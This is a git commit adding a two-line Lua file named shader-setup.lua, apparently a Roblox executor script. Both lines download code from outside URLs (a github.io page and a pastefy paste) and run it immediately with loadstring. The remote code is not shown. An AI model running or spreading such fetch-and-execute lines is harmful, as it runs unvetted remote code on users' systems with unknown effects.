89fbdd48782dc12b3517e02f6096c5ec5cac4cc1
Vantablade Youtube <jacehawkins16@gmail.com>
2026-03-19 22:55:49 -0500

    Create shader-setup.lua

---
+++ shader-setup.lua
@@ -0,0 +1,2 @@
+loadstring(game:HttpGet('https://jacehawkins16-svg.github.io/discord.gg-ERNQpp8NpE/vantas%20universal%20semirealistic%20camera.lua'))()
+loadstring(game:HttpGet("https://pastefy.app/ymruM9Ul/raw", true))()
